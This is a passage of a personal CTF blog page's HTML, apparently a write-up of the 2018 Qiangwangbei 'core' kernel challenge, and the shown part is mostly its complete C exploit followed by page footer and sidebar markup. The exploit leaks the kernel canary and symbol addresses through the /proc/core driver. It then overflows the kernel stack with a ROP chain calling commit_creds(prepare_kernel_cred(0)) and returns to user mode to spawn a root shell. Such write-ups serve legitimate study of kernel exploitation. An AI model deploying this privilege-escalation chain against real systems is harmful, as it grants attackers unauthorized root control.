class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CORE_READ 0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CORE_OFF 0x6677889C</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CORE_COPY 0x6677889A</span></span><br><span class="line"> </span><br><span class="line"><span class="type">size_t</span> vmlinux_base, commit_creds, prepare_kernel_cred;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">GetAddress</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="type">char</span> *ptr;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> FILE* fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> (!fd) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[-] ERROR.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">while</span>(fgets(buf, <span class="keyword">sizeof</span>(buf), fd)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (commit_creds &amp;&amp; prepare_kernel_cred)&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;[+] Find: commit_creds: 0x%llx\n[+] Find: prepare_kernel_cred: 0x%llx\n&quot;</span>, commit_creds, prepare_kernel_cred);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">   commit_creds = strtoull(buf, ptr, <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">   prepare_kernel_cred = strtoull(buf, ptr, <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">SaveStatus</span><span class="params">()</span> &#123;</span><br><span class="line"> __asm__(</span><br><span class="line">  <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">  <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">  <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">  <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">  <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">GetShell</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[-] CAN NOT GETSHELL.&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="type">size_t</span> rop[<span class="number">0x100</span>];</span><br><span class="line"> <span class="type">char</span> user_buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> <span class="type">char</span>* ptr;</span><br><span class="line"> <span class="type">int</span> i = <span class="number">8</span>;</span><br><span class="line"> </span><br><span class="line"> SaveStatus();</span><br><span class="line"> GetAddress();</span><br><span class="line"> vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line"> <span class="type">size_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"> <span class="type">size_t</span> pop_rdi = <span class="number">0xffffffff81679ba8</span> + offset;</span><br><span class="line"> <span class="type">size_t</span> pop_rdx = <span class="number">0xffffffff810a0f49</span> + offset;</span><br><span class="line"> <span class="type">size_t</span> mov_rdi_rax = <span class="number">0xffffffff8106a6d2</span> + offset; <span class="comment">// mov rdi, rax; jmp rdx;</span></span><br><span class="line"> <span class="type">size_t</span> swapgs = <span class="number">0xffffffff81a012da</span> + offset;  <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line"> <span class="type">size_t</span> iretq = <span class="number">0xffffffff81050ac2</span> + offset;   <span class="comment">// iretq; ret;</span></span><br><span class="line"> </span><br><span class="line"> <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> (!fd) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[-] OPEN /proc/core ERROR.&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> ioctl(fd, CORE_OFF, <span class="number">0x40</span>);															</span><br><span class="line"> ioctl(fd, <span class="number">0x6677889B</span>, user_buf); <span class="comment">//canary in buf.</span></span><br><span class="line"> <span class="type">size_t</span> canary = ((<span class="type">size_t</span>*)user_buf)[<span class="number">0</span>];</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;[+] Find canary: 0x%llx\n&quot;</span>, canary);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//commit_creads(prepare_kernel_cred(0));</span></span><br><span class="line"> rop[i++] = canary;</span><br><span class="line"> rop[i++] = <span class="number">0</span>;</span><br><span class="line"> rop[i++] = pop_rdi;</span><br><span class="line"> rop[i++] = <span class="number">0</span>;</span><br><span class="line"> rop[i++] = prepare_kernel_cred;</span><br><span class="line"> rop[i++] = pop_rdx;</span><br><span class="line"> rop[i++] = commit_creds;</span><br><span class="line"> rop[i++] = mov_rdi_rax;</span><br><span class="line"> <span class="comment">//swapgs --&gt; iretq: rip, cs, rflags, rsp, ss. GetShell</span></span><br><span class="line"> rop[i++] = swapgs;</span><br><span class="line"> rop[i++] = <span class="number">0</span>;</span><br><span class="line"> rop[i++] = iretq;</span><br><span class="line"> rop[i++] = (<span class="type">size_t</span>)GetShell;</span><br><span class="line"> rop[i++] = user_cs;</span><br><span class="line"> rop[i++] = user_rflags;</span><br><span class="line"> rop[i++] = user_sp;</span><br><span class="line"> rop[i++] = user_ss;</span><br><span class="line"> </span><br><span class="line"> write(fd, rop, <span class="keyword">sizeof</span>(rop));</span><br><span class="line">    ioctl(fd, CORE_COPY, <span class="number">0xffffffffffff0000</span>|<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">//传入一个负数，因为会被转为16位（2bytes）无符号数，最后的调用为 qmemcpy(v2, &amp;name, 0x100);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="如何上穿exp"><a class="markdownIt-Anchor" href="#如何上穿exp">#</a> 如何上穿 exp。？</h2>
+
+      <div class="tags">
+          <a href="/tags/learning/" rel="tag"><i class="ic i-tag"></i> learning</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2022-05-02 04:50:07" itemprop="dateModified" datetime="2022-05-02T04:50:07+08:00">2022-05-02</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="dreamcat WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="dreamcat Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="dreamcat PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>dreamcat <i class="ic i-at"><em>@</em></i>我他喵的
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/" title="强网杯2018_core">http://example.com/2022/05/01/强网杯2018-core/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/04/25/MRCTF-ezbash/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicliierfjj20zk0m8npd.jpg" title="MRCTF_ezbash">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> pwn</span>
+  <h3>MRCTF_ezbash</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/05/02/ciscn-babydriver/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexbei4hj20zk0m8npd.jpg" title="ciscn_babydriver">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> kernel</span>
+  <h3>ciscn_babydriver</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2018%E5%BC%BA%E7%BD%91%E6%9D%AFcore%E4%BD%9C%E4%B8%BAkernel%E5%AD%A6%E4%B9%A0%E5%BC%80%E5%A7%8B%E7%9A%84%E8%AE%B0%E5%BD%95%E6%A0%88%E6%BA%A2%E5%87%BAret2rop"><span class="toc-number">1.</span> <span class="toc-text"> 2018 强网杯 core，作为 kernel 学习开始的记录，栈溢出，ret2rop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AEzhishi"><span class="toc-number">1.1.</span> <span class="toc-text"> 前置 zhishi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text"> 1. 题目环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2"><span class="toc-number">1.3.</span> <span class="toc-text"> 2.</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#canary"><span class="toc-number">1.3.1.</span> <span class="toc-text"> canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kaslr"><span class="toc-number">1.3.2.</span> <span class="toc-text"> kaslr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core_base"><span class="toc-number">1.3.3.</span> <span class="toc-text"> core_base</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text"> 题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#core_ioctl"><span class="toc-number">1.4.1.</span> <span class="toc-text"> #core_ioctl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core_read"><span class="toc-number">1.4.2.</span> <span class="toc-text"> core_read</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core_copy_func"><span class="toc-number">1.4.3.</span> <span class="toc-text"> core_copy_func</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core_write"><span class="toc-number">1.4.4.</span> <span class="toc-text"> core_write</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text"> 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96vmlinux_base"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 获取 vmlinux_base</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84exp"><span class="toc-number">1.6.</span> <span class="toc-text"> 完整的 exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%B8%8A%E7%A9%BFexp"><span class="toc-number">1.7.</span> <span class="toc-text"> 如何上穿 exp。？</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li class="active"><a href="/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/" rel="bookmark" title="强网杯2018_core">强网杯2018_core</a></li><li><a href="/2022/05/02/ciscn-babydriver/" rel="bookmark" title="ciscn_babydriver">ciscn_babydriver</a></li><li><a href="/2022/05/03/inctf2021-kqueue/" rel="bookmark" title="inctf2021_kqueue">inctf2021_kqueue</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="dreamcat"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">dreamcat</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">33</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">4</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/04/25/MRCTF-ezbash/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/05/02/ciscn-babydriver/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/06/19/ciscn-2022-popcalc/" title="ciscn_2022_popcalc">ciscn_2022_popcalc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/01/note-file/" title="note_file">note_file</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/06/27/%E5%AD%A6%E4%B9%A0%E5%91%A8%E8%AE%B0-%E2%80%94%E2%80%94%E4%B8%80/" title="学习周记 ——一">学习周记 ——一</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/" title="glibc-2.35一些手法">glibc-2.35一些手法</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/19/starctf-babynote/" title="starctf_babynote">starctf_babynote</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/03/20/buuoj-heapcreator/" title="buuoj_heapcreator">buuoj_heapcreator</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/09/20/tctf2022ezvm/" title="tctf2022ezvm">tctf2022ezvm</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/06/18/ciscn2022-syscall/" title="ciscn2022_syscall">ciscn2022_syscall</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/25/MRCTF-ezbash/" title="MRCTF_ezbash">MRCTF_ezbash</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/06/21/ciscn-2022-whatheap/" title="ciscn_2022_whatheap">ciscn_2022_whatheap</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">dreamcat @ dreamcat</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="Symbols count total">282k words</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="Reading time total">4:16</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/05/01/强网杯2018-core/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)dreamcat?"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
